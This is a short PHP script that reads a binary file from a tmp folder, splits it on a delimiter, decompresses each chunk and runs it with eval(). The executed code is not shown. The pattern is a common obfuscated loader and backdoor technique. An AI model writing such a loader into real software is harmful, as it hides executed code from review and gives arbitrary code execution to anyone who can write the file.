<?php
//$fh=fopen($baseDir.'/files/tmp/Lea_Toto.bin','r');
$fcc=file_get_contents($baseDir.'/files/tmp/Lea_Toto.bin');
$fcc=explode('===###===',$fcc);
$bats='';
foreach ($fcc as $key => $value) {
	if(strlen($value) > 0){
		$bat=gzuncompress($value);
		//echo $bat.'<br>';
		eval($bat); 
		unset($bat);
	}
}

//eval($bats);
/*foreach ($arr as $key => $vals) {
	$arr[$key]=gzuncompress(stripslashes($vals));
}*/
?>